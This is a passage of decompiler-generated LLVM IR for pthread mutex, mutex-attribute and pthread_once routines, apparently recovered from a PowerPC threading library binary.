  %v1_10016700 = call i32 @__pthread_manager(i32 %v0_100166fc)
  ret i32 %v1_10016700

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_10040ac0.1013 to i32), { 2, 3, 6, 1, 4, 7, 0, 5, 8 }
}

define i32 @__pthread_trylock(i32* %arg1) local_unnamed_addr {
entry:
  %v2_100167086 = load i32, i32* %arg1, align 4
  %v3_1001670c7 = icmp eq i32 %v2_100167086, 0
  br i1 %v3_1001670c7, label %dec_label_pc_1001671c.lr.ph, label %dec_label_pc_10016714

dec_label_pc_1001671c.lr.ph:                      ; preds = %entry
  %r11.promoted.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001671c

dec_label_pc_10016714:                            ; preds = %dec_label_pc_10016730, %entry
  ret i32 16

dec_label_pc_1001671c:                            ; preds = %dec_label_pc_1001671c.lr.ph, %dec_label_pc_10016730
  %v5_10016720 = icmp eq i32 %r11.promoted.pre, 0
  br i1 %v5_10016720, label %dec_label_pc_1001673c, label %dec_label_pc_10016730

dec_label_pc_10016730:                            ; preds = %dec_label_pc_1001671c
  %v2_10016708 = load i32, i32* %arg1, align 4
  %v3_1001670c = icmp eq i32 %v2_10016708, 0
  br i1 %v3_1001670c, label %dec_label_pc_1001671c, label %dec_label_pc_10016714

dec_label_pc_1001673c:                            ; preds = %dec_label_pc_1001671c
  store i32 0, i32* @r11, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1001671c, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32* %arg1) local_unnamed_addr {
entry:
  %v2_100167486 = load i32, i32* %arg1, align 4
  %v3_1001674c7 = icmp eq i32 %v2_100167486, 0
  br i1 %v3_1001674c7, label %dec_label_pc_1001675c.lr.ph, label %dec_label_pc_10016754

dec_label_pc_1001675c.lr.ph:                      ; preds = %entry
  %r11.promoted.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001675c

dec_label_pc_10016754:                            ; preds = %dec_label_pc_10016770, %entry
  ret i32 16

dec_label_pc_1001675c:                            ; preds = %dec_label_pc_1001675c.lr.ph, %dec_label_pc_10016770
  %v5_10016760 = icmp eq i32 %r11.promoted.pre, 0
  br i1 %v5_10016760, label %dec_label_pc_1001677c, label %dec_label_pc_10016770

dec_label_pc_10016770:                            ; preds = %dec_label_pc_1001675c
  %v2_10016748 = load i32, i32* %arg1, align 4
  %v3_1001674c = icmp eq i32 %v2_10016748, 0
  br i1 %v3_1001674c, label %dec_label_pc_1001675c, label %dec_label_pc_10016754

dec_label_pc_1001677c:                            ; preds = %dec_label_pc_1001675c
  ret i32 0

; uselistorder directives
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1001675c, { 1, 0 }
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_10016784 = icmp eq i32* %arg2, null
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001678c = add i32 %arg1, 20
  %v3_1001678c = inttoptr i32 %v2_1001678c to i32*
  store i32 0, i32* %v3_1001678c, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v0_10016794 = load i32, i32* %r0.global-to-local, align 4
  %v2_10016794 = add i32 %arg1, 16
  %v3_10016794 = inttoptr i32 %v2_10016794 to i32*
  store i32 %v0_10016794, i32* %v3_10016794, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  br i1 %v3_10016784, label %dec_label_pc_100167a4, label %dec_label_pc_100167a0

dec_label_pc_100167a0:                            ; preds = %entry
  %v2_100167a0 = load i32, i32* %arg2, align 4
  store i32 %v2_100167a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100167a4

dec_label_pc_100167a4:                            ; preds = %entry, %dec_label_pc_100167a0
  %v0_100167a4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100167a4 = add i32 %arg1, 8
  %v3_100167a4 = inttoptr i32 %v2_100167a4 to i32*
  store i32 %v0_100167a4, i32* %v3_100167a4, align 4
  %v0_100167a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_100167a8 = add i32 %arg1, 12
  %v3_100167a8 = inttoptr i32 %v2_100167a8 to i32*
  store i32 %v0_100167a8, i32* %v3_100167a8, align 4
  %v0_100167ac = load i32, i32* %r9.global-to-local, align 4
  %v2_100167ac = add i32 %arg1, 4
  %v3_100167ac = inttoptr i32 %v2_100167ac to i32*
  store i32 %v0_100167ac, i32* %v3_100167ac, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 3, 1, 0, 4, 2 }
  uselistorder label %dec_label_pc_100167a4, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100167b8 = add i32 %arg1, 12
  %v2_100167b8 = inttoptr i32 %v1_100167b8 to i32*
  %v3_100167b8 = load i32, i32* %v2_100167b8, align 4
  %v1_100167c0 = icmp slt i32 %v3_100167b8, 0
  br i1 %v1_100167c0, label %dec_label_pc_10016804, label %dec_label_pc_100167cc

dec_label_pc_100167cc:                            ; preds = %entry
  %tmp = icmp slt i32 %v3_100167b8, 2
  br i1 %tmp, label %dec_label_pc_100167dc, label %dec_label_pc_100167d4

dec_label_pc_100167d4:                            ; preds = %dec_label_pc_100167cc
  %tmp2 = icmp slt i32 %v3_100167b8, 4
  br i1 %tmp2, label %dec_label_pc_100167ec, label %dec_label_pc_10016804

dec_label_pc_100167dc:                            ; preds = %dec_label_pc_100167cc
  %v1_100167dc = add i32 %arg1, 16
  %v2_100167dc = inttoptr i32 %v1_100167dc to i32*
  %v3_100167dc = load i32, i32* %v2_100167dc, align 4
  %v1_100167e0 = urem i32 %v3_100167dc, 2
  %v3_100167e0 = icmp eq i32 %v1_100167e0, 0
  br i1 %v3_100167e0, label %dec_label_pc_10016800, label %dec_label_pc_100167f8

dec_label_pc_100167ec:                            ; preds = %dec_label_pc_100167d4
  %v1_100167ec = add i32 %arg1, 16
  %v2_100167ec = inttoptr i32 %v1_100167ec to i32*
  %v3_100167ec = load i32, i32* %v2_100167ec, align 4
  %v3_100167f0 = icmp eq i32 %v3_100167ec, 0
  br i1 %v3_100167f0, label %dec_label_pc_10016800, label %dec_label_pc_100167f8

dec_label_pc_100167f8:                            ; preds = %dec_label_pc_100167dc, %dec_label_pc_100167ec
  br label %dec_label_pc_10016804

dec_label_pc_10016800:                            ; preds = %dec_label_pc_100167dc, %dec_label_pc_100167ec
  br label %dec_label_pc_10016804

dec_label_pc_10016804:                            ; preds = %dec_label_pc_100167d4, %entry, %dec_label_pc_100167f8, %dec_label_pc_10016800
  %v0_10016804 = phi i32 [ 22, %dec_label_pc_100167d4 ], [ 22, %entry ], [ 16, %dec_label_pc_100167f8 ], [ 0, %dec_label_pc_10016800 ]
  ret i32 %v0_10016804

; uselistorder directives
  uselistorder label %dec_label_pc_10016804, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10016800, { 1, 0 }
  uselistorder label %dec_label_pc_100167f8, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10016824 = icmp ugt i32 %arg2, 3
  br i1 %v2_10016824, label %dec_label_pc_10016838, label %dec_label_pc_10016830

dec_label_pc_10016830:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10016838

dec_label_pc_10016838:                            ; preds = %entry, %dec_label_pc_10016830
  %v0_10016838 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10016830 ]
  ret i32 %v0_10016838

; uselistorder directives
  uselistorder label %dec_label_pc_10016838, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10016840 = load i32, i32* %arg1, align 4
  %v2_10016848 = inttoptr i32 %arg2 to i32*
  store i32 %v2_10016840, i32* %v2_10016848, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10016860 = icmp eq i32 %arg1, 0
  %v2_10016860 = icmp ugt i32 %arg1, 1
  %v0_10016870 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10016860, i32 %v0_10016870)
  %v1_10016878 = select i1 %v1_10016860, i32 0, i32 38
  ret i32 %v1_10016878
}

define i32 @__pthread_once_fork_child(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10016898 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_100496ec.1078 to i32), i32* null)
  %v3_100168a8 = call i32 @pthread_cond_init(i32* nonnull @global_var_10049704.1079, i32 0)
  store i32 268697600, i32* @r11, align 4
  %v3_100168b0 = load i32, i32* @global_var_10045220.1080, align 4
  %v3_100168bc = icmp sgt i32 %v3_100168b0, 2147483643
  %v1_100168c0 = add i32 %v3_100168b0, 4
  br i1 %v3_100168bc, label %dec_label_pc_100168d0, label %dec_label_pc_100168d8

dec_label_pc_100168d0:                            ; preds = %entry
  br label %dec_label_pc_100168d8

dec_label_pc_100168d8:                            ; preds = %entry, %dec_label_pc_100168d0
  %storemerge = phi i32 [ 0, %dec_label_pc_100168d0 ], [ %v1_100168c0, %entry ]
  store i32 %storemerge, i32* @global_var_10045220.1080, align 4
  ret i32 %v3_100168a8

; uselistorder directives
  uselistorder label %dec_label_pc_100168d8, { 1, 0 }
}

define i32 @pthread_mutex_unlock() local_unnamed_addr {
entry:
  %v0_100168f4 = load i32, i32* @r3, align 4
  %v1_100168f4 = add i32 %v0_100168f4, 12
  %v2_100168f4 = inttoptr i32 %v1_100168f4 to i32*
  %v3_100168f4 = load i32, i32* %v2_100168f4, align 4
  %v3_100168f8 = icmp eq i32 %v3_100168f4, 1
  br i1 %v3_100168f8, label %dec_label_pc_10016928, label %dec_label_pc_10016900

dec_label_pc_10016900:                            ; preds = %entry
  %v2_100168f8 = icmp sgt i32 %v3_100168f4, 1
  br i1 %v2_100168f8, label %dec_label_pc_10016910, label %dec_label_pc_10016904

dec_label_pc_10016904:                            ; preds = %dec_label_pc_10016900
  %v3_10016904 = icmp eq i32 %v3_100168f4, 0
  br i1 %v3_10016904, label %dec_label_pc_10016958, label %dec_label_pc_10016920

dec_label_pc_10016910:                            ; preds = %dec_label_pc_10016900
  %v3_10016910 = icmp eq i32 %v3_100168f4, 2
  br i1 %v3_10016910, label %dec_label_pc_10016968, label %dec_label_pc_10016918

dec_label_pc_10016918:                            ; preds = %dec_label_pc_10016910
  %v3_10016918 = icmp eq i32 %v3_100168f4, 3
  br i1 %v3_10016918, label %dec_label_pc_10016988, label %dec_label_pc_10016920

dec_label_pc_10016920:                            ; preds = %dec_label_pc_10016904, %dec_label_pc_10016918
  store i32 22, i32* @r9, align 4
  br label %dec_label_pc_10016998

dec_label_pc_10016928:                            ; preds = %entry
  %v1_10016928 = add i32 %v0_100168f4, 8
  %v2_10016928 = inttoptr i32 %v1_10016928 to i32*
  %v3_10016928 = load i32, i32* %v2_10016928, align 4
  %v1_1001692c = load i32, i32* @r2, align 4
  %v4_1001692c = icmp eq i32 %v3_10016928, %v1_1001692c
  br i1 %v4_1001692c, label %dec_label_pc_10016934, label %dec_label_pc_10016994

dec_label_pc_10016934:                            ; preds = %dec_label_pc_10016928
  %v1_10016934 = add i32 %v0_100168f4, 4
  %v2_10016934 = inttoptr i32 %v1_10016934 to i32*
  %v3_10016934 = load i32, i32* %v2_10016934, align 4
  %tmp6 = icmp slt i32 %v3_10016934, 1
  br i1 %tmp6, label %dec_label_pc_10016950, label %dec_label_pc_10016940

dec_label_pc_10016940:                            ; preds = %dec_label_pc_10016934
  %v1_10016940 = add i32 %v3_10016934, -1
  store i32 0, i32* @r9, align 4
  store i32 %v1_10016940, i32* %v2_10016934, align 4
  %v0_1001699c.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10016998

dec_label_pc_10016950:                            ; preds = %dec_label_pc_10016934
  store i32 0, i32* %v2_10016928, align 4
  %v0_10016958.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10016958

dec_label_pc_10016958:                            ; preds = %dec_label_pc_10016904, %dec_label_pc_10016950
  %v0_10016958 = phi i32 [ %v0_100168f4, %dec_label_pc_10016904 ], [ %v0_10016958.pre, %dec_label_pc_10016950 ]
  %v1_10016958 = add i32 %v0_10016958, 16
  store i32 %v1_10016958, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016960.1081 to i32), i32* @lr, align 4
  %v0_1001695c = call i32 @__pthread_unlock()
  br label %dec_label_pc_10016960

dec_label_pc_10016960:                            ; preds = %dec_label_pc_10016988, %dec_label_pc_10016958
  store i32 0, i32* @r9, align 4
  br label %dec_label_pc_10016998

dec_label_pc_10016968:                            ; preds = %dec_label_pc_10016910
  %v1_10016968 = add i32 %v0_100168f4, 8
  %v2_10016968 = inttoptr i32 %v1_10016968 to i32*
  %v3_10016968 = load i32, i32* %v2_10016968, align 4
  %v1_1001696c = load i32, i32* @r2, align 4
  %v4_1001696c = icmp eq i32 %v3_10016968, %v1_1001696c
  br i1 %v4_1001696c, label %dec_label_pc_10016974, label %dec_label_pc_10016994

dec_label_pc_10016974:                            ; preds = %dec_label_pc_10016968
  %v1_10016974 = add i32 %v0_100168f4, 16
  %v2_10016974 = inttoptr i32 %v1_10016974 to i32*
  %v3_10016974 = load i32, i32* %v2_10016974, align 4
  %v3_10016978 = icmp eq i32 %v3_10016974, 0
  br i1 %v3_10016978, label %dec_label_pc_10016994, label %dec_label_pc_10016980

dec_label_pc_10016980:                            ; preds = %dec_label_pc_10016974
  store i32 0, i32* %v2_10016968, align 4
  %v0_10016988.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10016988

dec_label_pc_10016988:                            ; preds = %dec_label_pc_10016918, %dec_label_pc_10016980
  %v0_10016988 = phi i32 [ %v0_100168f4, %dec_label_pc_10016918 ], [ %v0_10016988.pre, %dec_label_pc_10016980 ]
  %v1_10016988 = add i32 %v0_10016988, 16
  store i32 268528016, i32* @lr, align 4
  %v1_1001698c = inttoptr i32 %v1_10016988 to i32*
  %v2_1001698c = call i32 @__pthread_alt_unlock(i32* %v1_1001698c)
  br label %dec_label_pc_10016960

dec_label_pc_10016994:                            ; preds = %dec_label_pc_10016928, %dec_label_pc_10016968, %dec_label_pc_10016974
  store i32 1, i32* @r9, align 4
  br label %dec_label_pc_10016998

dec_label_pc_10016998:                            ; preds = %dec_label_pc_10016920, %dec_label_pc_10016960, %dec_label_pc_10016940, %dec_label_pc_10016994
  %v0_1001699c = phi i32 [ 22, %dec_label_pc_10016920 ], [ 0, %dec_label_pc_10016960 ], [ %v0_1001699c.pre, %dec_label_pc_10016940 ], [ 1, %dec_label_pc_10016994 ]
  ret i32 %v0_1001699c

; uselistorder directives
  uselistorder i32 %v0_100168f4, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder label %dec_label_pc_10016998, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10016994, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10016988, { 1, 0 }
  uselistorder label %dec_label_pc_10016958, { 1, 0 }
  uselistorder label %dec_label_pc_10016920, { 1, 0 }
}

define i32 @__pthread_once_fork_parent(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100496ec.1078 to i32), i32* @r3, align 4
  %v0_100169b4 = call i32 @pthread_mutex_unlock()
  ret i32 %v0_100169b4
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_100169cc = add i32 %arg1, 12
  %v2_100169cc = inttoptr i32 %v1_100169cc to i32*
  %v3_100169cc = load i32, i32* %v2_100169cc, align 4
  %v3_100169d0 = icmp eq i32 %v3_100169cc, 1
  br i1 %v3_100169d0, label %dec_label_pc_10016a10, label %dec_label_pc_100169d8

dec_label_pc_100169d8:                            ; preds = %entry
  %v2_100169d0 = icmp sgt i32 %v3_100169cc, 1
  br i1 %v2_100169d0, label %dec_label_pc_100169e8, label %dec_label_pc_100169dc

dec_label_pc_100169dc:                            ; preds = %dec_label_pc_100169d8
  %v3_100169dc = icmp eq i32 %v3_100169cc, 0
  br i1 %v3_100169dc, label %dec_label_pc_10016a00, label %dec_label_pc_100169f8

dec_label_pc_100169e8:                            ; preds = %dec_label_pc_100169d8
  %v3_100169e8 = icmp eq i32 %v3_100169cc, 2
  br i1 %v3_100169e8, label %dec_label_pc_10016a50, label %dec_label_pc_100169f0

dec_label_pc_100169f0:                            ; preds = %dec_label_pc_100169e8
  %v3_100169f0 = icmp eq i32 %v3_100169cc, 3
  br i1 %v3_100169f0, label %dec_label_pc_10016a7c, label %dec_label_pc_100169f8

dec_label_pc_100169f8:                            ; preds = %dec_label_pc_100169dc, %dec_label_pc_100169f0
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016a8c

dec_label_pc_10016a00:                            ; preds = %dec_label_pc_100169dc
  %v1_10016a00 = add i32 %arg1, 16
  store i32 %v1_10016a00, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10016a0c.1082 to i32), i32* @lr, align 4
  %v0_10016a08 = call i32 @__pthread_lock()
  br label %dec_label_pc_10016a88

dec_label_pc_10016a10:                            ; preds = %entry
  %v1_10016a10 = add i32 %arg1, 8
  %v2_10016a10 = inttoptr i32 %v1_10016a10 to i32*
  %v3_10016a10 = load i32, i32* %v2_10016a10, align 4
  %v0_10016a14 = load i32, i32* @r2, align 4
  store i32 %v0_10016a14, i32* @r30, align 4
  %v4_10016a18 = icmp eq i32 %v3_10016a10, %v0_10016a14
  br i1 %v4_10016a18, label %dec_label_pc_10016a20, label %dec_label_pc_10016a34

dec_label_pc_10016a20:                            ; preds = %dec_label_pc_10016a10
  %v1_10016a20 = add i32 %arg1, 4
  %v2_10016a20 = inttoptr i32 %v1_10016a20 to i32*
  %v3_10016a20 = load i32, i32* %v2_10016a20, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016a28 = add i32 %v3_10016a20, 1
  store i32 %v1_10016a28, i32* @r9, align 4
  store i32 %v1_10016a28, i32* %v2_10016a20, align 4
  br label %dec_label_pc_10016a8c

dec_label_pc_10016a34:                            ; preds = %dec_label_pc_10016a10
  %v1_10016a34 = add i32 %arg1, 16
  store i32 %v1_10016a34, i32* @r3, align 4
  store i32 %v0_10016a14, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10016a40.1083 to i32), i32* @lr, align 4
  %v0_10016a3c = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10016a48 = load i32, i32* @r31, align 4
  %v2_10016a48 = add i32 %v1_10016a48, 4
  %v3_10016a48 = inttoptr i32 %v2_10016a48 to i32*
  store i32 0, i32* %v3_10016a48, align 4
  br label %dec_label_pc_10016a74

dec_label_pc_10016a50:                            ; preds = %dec_label_pc_100169e8
  %v1_10016a50 = add i32 %arg1, 8
  %v2_10016a50 = inttoptr i32 %v1_10016a50 to i32*
  %v3_10016a50 = load i32, i32* %v2_10016a50, align 4
  %v0_10016a54 = load i32, i32* @r2, align 4
  store i32 %v0_10016a54, i32* @r30, align 4
  store i32 35, i32* %r3.global-to-local, align 4
  %v4_10016a5c = icmp eq i32 %v3_10016a50, %v0_10016a54
  br i1 %v4_10016a5c, label %dec_label_pc_10016a8c, label %dec_label_pc_10016a64

dec_label_pc_10016a64:                            ; preds = %dec_label_pc_10016a50
  %v1_10016a64 = add i32 %arg1, 16
  store i32 %v1_10016a64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016a70.1084 to i32), i32* @lr, align 4
  %v2_10016a6c = inttoptr i32 %v1_10016a64 to i32*
  %v3_10016a6c = call i32 @__pthread_alt_lock(i32* %v2_10016a6c, i32 %v0_10016a54)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016a74

dec_label_pc_10016a74:                            ; preds = %dec_label_pc_10016a34, %dec_label_pc_10016a64
  %v0_10016a74 = load i32, i32* @r30, align 4
  %v1_10016a74 = load i32, i32* @r31, align 4
  %v2_10016a74 = add i32 %v1_10016a74, 8
  %v3_10016a74 = inttoptr i32 %v2_10016a74 to i32*
  store i32 %v0_10016a74, i32* %v3_10016a74, align 4
  br label %dec_label_pc_10016a8c

dec_label_pc_10016a7c:                            ; preds = %dec_label_pc_100169f0
  %v1_10016a7c = add i32 %arg1, 16
  store i32 %v1_10016a7c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10016a88.1085 to i32), i32* @lr, align 4
  %v2_10016a84 = inttoptr i32 %v1_10016a7c to i32*
  %v3_10016a84 = call i32 @__pthread_alt_lock(i32* %v2_10016a84, i32 0)
  br label %dec_label_pc_10016a88

dec_label_pc_10016a88:                            ; preds = %dec_label_pc_10016a00, %dec_label_pc_10016a7c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016a8c

dec_label_pc_10016a8c:                            ; preds = %dec_label_pc_10016a50, %dec_label_pc_10016a74, %dec_label_pc_10016a20, %dec_label_pc_100169f8, %dec_label_pc_10016a88
  %v0_10016a9c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10016a9c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 7, 5, 4, 8, 6, 3, 2, 9 }
  uselistorder label %dec_label_pc_10016a8c, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10016a88, { 1, 0 }
  uselistorder label %dec_label_pc_10016a74, { 1, 0 }
  uselistorder label %dec_label_pc_100169f8, { 1, 0 }
}

define i32 @__pthread_once_fork_prepare(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10016aa8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100496ec.1078 to i32))
  ret i32 %v1_10016aa8
}

define i32 @pthread_once(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10016ac4 = load i32, i32* %arg1, align 4
  %v3_10016ac8 = icmp eq i32 %v2_10016ac4, 2
  br i1 %v3_10016ac8, label %dec_label_pc_10016bc4, label %dec_label_pc_10016ad8

dec_label_pc_10016ad8:                            ; preds = %entry
  store i32 268528356, i32* @lr, align 4
  %v1_10016ae0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100496ec.1078 to i32))
  %v0_10016ae4 = load i32, i32* @r31, align 4
  %v1_10016ae4 = inttoptr i32 %v0_10016ae4 to i32*
  %v2_10016ae4 = load i32, i32* %v1_10016ae4, align 4
  store i32 %v2_10016ae4, i32* @r11, align 4
  %v1_10016ae8 = urem i32 %v2_10016ae4, 4
  %v3_10016aec = icmp eq i32 %v1_10016ae8, 1
  br i1 %v3_10016aec, label %dec_label_pc_10016af4, label %dec_label_pc_10016b18.preheader

dec_label_pc_10016af4:                            ; preds = %dec_label_pc_10016ad8
  %v1_10016af8 = call i32 @__asm_rlwinm(i32 %v2_10016ae4, i32 0, i32 0, i32 29)
  %v3_10016afc = load i32, i32* @global_var_10045220.1080, align 4
  %v4_10016b00 = icmp eq i32 %v1_10016af8, %v3_10016afc
  br i1 %v4_10016b00, label %dec_label_pc_10016b18.preheader, label %dec_label_pc_10016b08

dec_label_pc_10016b08:                            ; preds = %dec_label_pc_10016af4
  %v1_10016b0c = load i32, i32* @r31, align 4
  %v2_10016b0c = inttoptr i32 %v1_10016b0c to i32*
  store i32 0, i32* %v2_10016b0c, align 4
  br label %dec_label_pc_10016b18.preheader

dec_label_pc_10016b18.preheader:                  ; preds = %dec_label_pc_10016b08, %dec_label_pc_10016af4, %dec_label_pc_10016ad8
  %v0_10016b185 = load i32, i32* @r31, align 4
  %v1_10016b186 = inttoptr i32 %v0_10016b185 to i32*
  %v2_10016b187 = load i32, i32* %v1_10016b186, align 4
  store i32 %v2_10016b187, i32* @r9, align 4
  %v1_10016b288 = urem i32 %v2_10016b187, 4
  %v3_10016b3011 = icmp eq i32 %v1_10016b288, 1
  br i1 %v3_10016b3011, label %dec_label_pc_10016b14, label %dec_label_pc_10016b38

dec_label_pc_10016b14:                            ; preds = %dec_label_pc_10016b18.preheader, %dec_label_pc_10016b14
  %v2_10016b1812 = phi i32 [ %v2_10016b18, %dec_label_pc_10016b14 ], [ %v2_10016b187, %dec_label_pc_10016b18.preheader ]
  store i32 268528408, i32* @lr, align 4
  %v3_10016b14 = call i32 @__GI_pthread_cond_wait(i32 ptrtoint (i32* @global_var_10049704.1079 to i32), i32 ptrtoint (i32* @global_var_100496ec.1078 to i32), i32 %v2_10016b1812)
  %v0_10016b18 = load i32, i32* @r31, align 4
  %v1_10016b18 = inttoptr i32 %v0_10016b18 to i32*
  %v2_10016b18 = load i32, i32* %v1_10016b18, align 4
  store i32 %v2_10016b18, i32* @r9, align 4
  %v1_10016b28 = urem i32 %v2_10016b18, 4
  %v3_10016b30 = icmp eq i32 %v1_10016b28, 1
  br i1 %v3_10016b30, label %dec_label_pc_10016b14, label %dec_label_pc_10016b38

dec_label_pc_10016b38:                            ; preds = %dec_label_pc_10016b14, %dec_label_pc_10016b18.preheader
  %v1_10016b18.lcssa = phi i32* [ %v1_10016b186, %dec_label_pc_10016b18.preheader ], [ %v1_10016b18, %dec_label_pc_10016b14 ]
  %v2_10016b18.lcssa = phi i32 [ %v2_10016b187, %dec_label_pc_10016b18.preheader ], [ %v2_10016b18, %dec_label_pc_10016b14 ]
  %v3_10016b38 = icmp eq i32 %v2_10016b18.lcssa, 0
  store i32 0, i32* @r29, align 4
  br i1 %v3_10016b38, label %dec_label_pc_10016b44, label %dec_label_pc_10016ba4

dec_label_pc_10016b44:                            ; preds = %dec_label_pc_10016b38
  store i32 268697600, i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_100496ec.1078 to i32), i32* @r3, align 4
  %v3_10016b4c = load i32, i32* @global_var_10045220.1080, align 4
  store i32 ptrtoint (i32* @global_var_100496ec.1078 to i32), i32* @r29, align 4
  %v1_10016b54 = or i32 %v3_10016b4c, 1
  store i32 %v1_10016b54, i32* %v1_10016b18.lcssa, align 4
  store i32 268528480, i32* @lr, align 4
  %v0_10016b5c = call i32 @pthread_mutex_unlock()
  %v2_10016b64 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10016b64, i32* @r28, align 4
  %v0_10016b68 = load i32, i32* @r31, align 4
  %v4_10016b74 = call i32 @_pthread_cleanup_push(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 27612), i32 %v0_10016b68)
  %v0_10016b78 = load i32, i32* @r30, align 4
  call void @__pseudo_call(i32 %v0_10016b78)
  store i32 268528524, i32* @lr, align 4
  %v3_10016b88 = call i32 @_pthread_cleanup_pop(i32* nonnull %stack_var_-40, i32 0)
  %v0_10016b8c = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10016b94.1086 to i32), i32* @lr, align 4
  %v1_10016b90 = call i32 @pthread_mutex_lock(i32 %v0_10016b8c)
  store i32 1, i32* @r29, align 4
  %v1_10016ba0 = load i32, i32* @r31, align 4
  %v2_10016ba0 = inttoptr i32 %v1_10016ba0 to i32*
  store i32 2, i32* %v2_10016ba0, align 4
  br label %dec_label_pc_10016ba4

dec_label_pc_10016ba4:                            ; preds = %dec_label_pc_10016b38, %dec_label_pc_10016b44
  store i32 ptrtoint (i32* @global_var_100496ec.1078 to i32), i32* @r3, align 4
  store i32 268528560, i32* @lr, align 4
  %v0_10016bac = call i32 @pthread_mutex_unlock()
  %v0_10016bb0 = load i32, i32* @r29, align 4
  %v3_10016bb0 = icmp eq i32 %v0_10016bb0, 0
  br i1 %v3_10016bb0, label %dec_label_pc_10016bc4, label %dec_label_pc_10016bb8

dec_label_pc_10016bb8:                            ; preds = %dec_label_pc_10016ba4
  store i32 268528580, i32* @lr, align 4
  %v1_10016bc0 = call i32 @pthread_cond_broadcast(i32 ptrtoint (i32* @global_var_10049704.1079 to i32))
  br label %dec_label_pc_10016bc4

dec_label_pc_10016bc4:                            ; preds = %entry, %dec_label_pc_10016ba4, %dec_label_pc_10016bb8
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10016b18, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10016b187, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10016ae4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* @global_var_10045220.1080, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10016bc4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10016ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10016b14, { 1, 0 }
}

define i32 @pthread_once_cancelhandler(i32* %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100496ec.1078 to i32), i32* @r29, align 4
